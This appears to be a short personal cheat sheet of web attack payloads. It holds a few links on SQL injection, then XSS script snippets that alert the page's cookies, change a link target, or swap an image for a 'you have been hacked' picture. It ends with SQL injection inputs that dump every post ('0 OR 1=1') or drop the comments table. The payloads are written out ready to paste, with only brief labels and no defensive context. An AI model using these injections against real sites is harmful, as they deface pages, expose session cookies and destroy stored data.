link_sqli:
  https://blog.railwaymen.org/hacking-ruby-rails-sql-injection/
  http://www.unixwiz.net/techtips/sql-injection.html
  https://www.w3schools.com/sql/sql_injection.asp

******************** XSS *************************
<script>document.getElementsByClassName("post-title")[1].setAttribute("href", "https://www.google.com.vn/?gfe_rd=cr&dcr=0&ei=urAeWp-SJMaE0ATfypnYBQ")</script>

*****
<script>
setTimeout(function(){
 alert('cookie: ' + document.cookie);
}, 2000);
</script> hello

***************
<script>
setTimeout(function(){
 document.getElementById("image-xss").setAttribute("src", "https://t3n9sm.c2.acecdn.net/wp-content/uploads/2017/06/you-have-been-hacked.jpg");
}, 2000);
</script> Change image

************

<script>
setTimeout(function(){
 document.getElementsByClassName("post-title")[1].setAttribute("href", "https://www.google.com.vn/?gfe_rd=cr&dcr=0&ei=urAeWp-SJMaE0ATfypnYBQ");
}, 2000);
</script> Change url href

************ SQLi**************************

search all post: 0 OR 1=1

drop table comments: SELECT *
  FROM posts
 WHERE title = 'x'; DROP TABLE comments; --';






